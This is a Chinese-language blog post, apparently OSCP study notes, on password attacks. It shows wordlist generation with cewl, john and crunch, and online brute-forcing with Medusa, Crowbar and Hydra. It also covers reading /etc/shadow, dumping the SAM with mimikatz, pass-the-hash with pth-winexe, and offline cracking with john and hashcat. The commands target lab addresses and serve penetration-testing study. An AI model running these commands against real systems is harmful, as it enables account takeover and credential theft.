@@ -1,0 +1,843 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="密码攻击相关">
+<meta property="og:type" content="article">
+<meta property="og:title" content="密码攻击">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/08/18/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="密码攻击相关">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184452.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184741.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818185523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818185946.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818201403.png">
+<meta property="article:published_time" content="2022-08-18T10:37:55.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:05:47.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="OSCP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184452.png">
+  
+  
+  
+  <title>密码攻击 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="密码攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-18 18:37" pubdate>
+          2022年8月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">密码攻击</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul>
+<li>十次成功的渗透测试至少七次于密码攻击有关</li>
+<li>基于常用密码字典的攻击, 时间可控；纯暴力破解不现实</li>
+<li>获得基础访问权限后, 进一步提取密码HASH(明文、PtH碰撞)</li>
+<li>通过信息收集直接获取账号密码</li>
+</ul>
+<h2 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h2><h3 id="密码字典-1"><a href="#密码字典-1" class="headerlink" title="密码字典"></a>密码字典</h3><ul>
+<li><p>Kali包含的密码字典</p>
+<ul>
+<li><code>/usr/share/wordlists</code></li>
+<li><code>/usr/share/seclist</code></li>
+</ul>
+</li>
+<li><p>专属密码字典</p>
+<ul>
+<li>通过添加特定目标组织的单词和短语来提高单词列表的实效性</li>
+<li>向字典中添加特定企业的技术、产品名称、变形, 提高其有效性</li>
+<li>使用cewl等工具生成专属字典</li>
+<li><code>kali@kali:~$ cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt # 最小6个字符</code></li>
+</ul>
+</li>
+<li><p>密码规则, leet -&gt; 1337变形</p>
+</li>
+<li><p>john可以按照规则自动生成字典, 并根据规则变形密码</p>
+</li>
+<li><p>添加规则, 在每个密码结尾加2个数字<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184452.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>使用规则变形密码, 执行破解</p>
+<ul>
+<li><code>kali@kali:~$ john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul>
+<li>所有字符组合的纯密码爆破不现实</li>
+<li>按指定长度和字符组合规则来生成爆破密码字典(1大写+2小写+2符号+3数字)<ul>
+<li><code>kali@kali:~$ crunch 8 8 -t ,@@^^%%%</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818184741.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+<li>生成4-6字节hex字符密码爆破字典<ul>
+<li><code>kali@kali:~$ crunch 4 6 0123456789ABCDEF -o crunch.txt</code></li>
+</ul>
+</li>
+<li>指定字符集生成密码字典<ul>
+<li><code>kali@kali:~$ crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt # 我们可以指定字符集文件的路径（-f /usr/share/crunch/charset.lst）并选择混合字母集mixalpha，其中包括所有小写和大写字母</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h2><h3 id="在线密码破解-1"><a href="#在线密码破解-1" class="headerlink" title="在线密码破解"></a>在线密码破解</h3><ul>
+<li>流量巨大</li>
+<li>日志会记录大量失败尝试</li>
+<li>账号被锁定机制</li>
+</ul>
+<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><ul>
+<li>执行密码爆破<ul>
+<li><code>kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h3><ul>
+<li>支持的协议类型有限</li>
+<li>支持SSH公钥认证破解, 和Windows系统的RDP密码破解</li>
+<li><code>kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1</code></li>
+</ul>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><ul>
+<li>很猛</li>
+<li>爆破ssh密码<ul>
+<li><code>kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1</code></li>
+</ul>
+</li>
+<li>HTTP POST方法密码破解<ul>
+<li><code>kali@kali:~$ hydra http-form-post -U # 查看模块用法</code></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>确定身份认证URL</li>
+<li>查看源码, 了解表单内容</li>
+<li>确定判断条件字符串(失败时现实 “INVALID LOGIN”)</li>
+</ol>
+<ul>
+<li><code>kali@kali:~$ hydra 10.11.0.22 http-form-post &quot;/form/frontpage.php:user=admin&amp;pass=^PAS S^:INVALID LOGIN&quot; -l admin -P /usr/share/wordlists/rockyou.txt -vV -f</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818185523.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="哈希攻击"><a href="#哈希攻击" class="headerlink" title="哈希攻击"></a>哈希攻击</h2><h3 id="哈希攻击-1"><a href="#哈希攻击-1" class="headerlink" title="哈希攻击"></a>哈希攻击</h3><ul>
+<li>密码通常以单向加密的HASH值形式存储与数据库中</li>
+<li>HASH类型<ul>
+<li>Openwall 提供HASH类型的识别功能(长度、字符类型、算法特殊符号)</li>
+<li><code>http://openwall.info/wiki/john/sample-hashes</code></li>
+</ul>
+</li>
+<li>在线查找、破解HASH值</li>
+<li>Hashid识别工具<ul>
+<li><code>kali@kali:~$ hashid c43ee559d69bc7f691fe2fbfe8a5ef0a</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818185946.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h3 id="Linux密码哈希"><a href="#Linux密码哈希" class="headerlink" title="Linux密码哈希"></a>Linux密码哈希</h3><ul>
+<li>分析识别Linux系统账号的密码结构<ul>
+<li><code>kali@kali:~$ sudo grep root /etc/shadow</code></li>
+<li><code>root:$6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaU cLaWtP/gewQkO7jT/:17564:0:99999:7:::</code></li>
+</ul>
+</li>
+<li>密码部分构成<ul>
+<li>$6: SHA-512算法</li>
+<li>$Rw99zZ2B: 加盐(随机值), 结合明文密码生成密码密文</li>
+<li><a target="_blank" rel="noopener" href="https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils">https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="Windows密码哈希"><a href="#Windows密码哈希" class="headerlink" title="Windows密码哈希"></a>Windows密码哈希</h3><ul>
+<li>Windows系统账号的密码存储于SAM文件中<ul>
+<li>为防止离线密码破解, 从NT4.0 SP3开始引入SYSKEY加密SAM文件;</li>
+</ul>
+</li>
+<li>NT&#x3D;&gt; Windows 2003 包含两种密码HASH &#x3D;&gt; LM(DES)、NTLM(MD4)</li>
+<li>Windows内核独占锁定SAM数据库, 运行过程中无法拷贝SAM文件<ul>
+<li>mimikatz可以DUMP HASH</li>
+</ul>
+</li>
+<li>由于LSASS是一个以SYSTEM用于运行的特权进程, 因此mimikatz需要管理员权限才能提取其中的HASH</li>
+</ul>
+<h3 id="使用mimikatz读取Windows密码哈希"><a href="#使用mimikatz读取Windows密码哈希" class="headerlink" title="使用mimikatz读取Windows密码哈希"></a>使用mimikatz读取Windows密码哈希</h3><ul>
+<li><code>C:\&gt; C:\Tools\password_attacks\mimikatz.exe</code></li>
+<li><code>mimikatz # privilege::debug</code><ul>
+<li>启用修改另一个进程所需的 SeDebugPrivilge 访问权限。如果失败, 则说明非管理员权限</li>
+</ul>
+</li>
+<li><code>mimikatz # token::elevate</code><ul>
+<li>从高完整性级别提升为SYSTEM完整性级别</li>
+</ul>
+</li>
+<li><code>mimikatz # lsadump::sam</code></li>
+</ul>
+<h3 id="PtH攻击"><a href="#PtH攻击" class="headerlink" title="PtH攻击"></a>PtH攻击</h3><ul>
+<li>Windows系统密码不加盐, 所以可以直接用HASH登录</li>
+<li>利用一台计算机获得的HASH去碰撞内网其他主机 &#x3D;&gt; PASS THE HASH</li>
+<li>通过SMB协议PtH执行系统命令</li>
+<li>PtH执行CMD命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd<br>E_md4hash wrapper called.<br>HASH PASS: Substituting user supplied NTLM HASH...<br>Microsoft Windows [Version 10.0.16299.309]<br>(c) 2017 Microsoft Corporation. All rights reserved.<br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h3><ul>
+<li>生成破解文件<ul>
+<li><code>kali@kali:~$ unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</code></li>
+<li><code>kali@kali:~$ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></li>
+</ul>
+</li>
+<li>HASHCAT支持CPU+GPU计算, 支持算法识别和字典变形处理<ul>
+<li><code>C:\Users\Cracker\hashcat-4.2.1&gt; hashcat64.exe -b # 测量GPU计算能力</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818201403.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/OSCP-Notes/" class="category-chain-item">OSCP-Notes</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP/">#OSCP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>密码攻击</div>
+      <div>https://c47sh4rk.github.io/2022/08/18/密码攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月18日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/18/%E9%9A%A7%E9%81%93%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="隧道与端口转发">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">隧道与端口转发</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/18/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" title="本地提权">
+                        <span class="hidden-mobile">本地提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
